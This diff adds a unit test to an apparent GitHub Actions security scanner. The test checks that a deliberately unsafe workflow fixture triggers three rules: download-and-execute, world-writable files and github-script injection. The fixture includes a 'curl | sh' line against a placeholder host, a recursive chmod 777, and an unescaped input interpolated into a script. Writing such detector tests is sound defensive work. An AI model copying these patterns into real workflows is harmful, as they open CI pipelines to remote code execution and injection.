@@ -109,3 +109,22 @@ jobs:
     ["secrets-in-privileged-workflow", "unsafe-workflow-run"],
   );
 });
+
+test("detects direct download execution, world-writable files and github-script injection", () => {
+  const findings = checkWorkflowSecurity(".github/workflows/unsafe.yml", `name: Unsafe
+on: [push]
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsSL https://example.test/install.sh | sh
+      - run: chmod -R 777 output
+      - uses: actions/github-script@08c6903cd8c0fde910a37f88322edcfb5dd907a8
+        with:
+          script: console.log('\${{ inputs.message }}')
+`);
+  const ids = findings.map((finding) => finding.ruleId);
+  for (const expected of ["shell-download-execution", "world-writable-files", "github-script-injection"]) assert.ok(ids.includes(expected), `missing ${expected}`);
+});
